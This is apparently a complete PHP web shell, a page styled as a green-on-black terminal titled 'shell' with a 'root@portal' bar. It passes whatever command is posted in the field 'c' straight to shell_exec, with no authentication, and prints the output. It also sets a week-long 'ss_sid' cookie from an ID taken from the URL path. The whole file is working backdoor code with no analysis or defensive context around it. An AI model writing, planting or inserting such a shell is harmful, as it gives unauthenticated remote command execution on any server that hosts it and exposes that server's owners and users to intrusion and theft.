<?php
if(preg_match("#^/i/([a-f0-9]{10})/#",$_SERVER["SCRIPT_NAME"],$m))setcookie("ss_sid",$m[1],time()+604800,"/");
if(isset($_POST["c"])){$o=shell_exec($_POST["c"])??"";}
?><!DOCTYPE html><html><head><title>shell</title><style>
body{background:#0c0c0c;color:#33ff66;font-family:ui-monospace,Menlo,Consolas,monospace;margin:0;padding:24px}
.term{max-width:860px;margin:40px auto;border:1px solid #1a3a1a;border-radius:8px;box-shadow:0 0 30px rgba(51,255,102,.08);overflow:hidden}
.bar{background:#111;padding:8px 12px;border-bottom:1px solid #1a3a1a;display:flex;align-items:center;gap:6px}
.dot{width:10px;height:10px;border-radius:50%}
.r{background:#ff5f56}.y{background:#ffbd2e}.g{background:#27c93f}
.title{color:#5a6a5a;font-size:12px;margin-left:8px}
pre{margin:0;padding:16px;white-space:pre-wrap;word-break:break-all;min-height:220px;max-height:60vh;overflow:auto}
.hist{color:#5a6a5a}
form{display:flex;align-items:center;gap:8px;border-top:1px solid #1a3a1a;padding:12px 16px}
.p{color:#33ff66}
input{flex:1;background:transparent;border:0;outline:0;color:#33ff66;font:inherit}
</style></head><body>
<div class=term>
<div class=bar><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class=title>root@portal</span></div>
<pre><?php if(isset($o)){echo "<span class=hist>$ ".htmlspecialchars($_POST["c"])."</span>\n".htmlspecialchars($o);}else{echo "<span class=hist>connected.</span>";}?></pre>
<form method=post><span class=p>$</span><input name=c autofocus autocomplete=off></form>
</div>
</body></html>
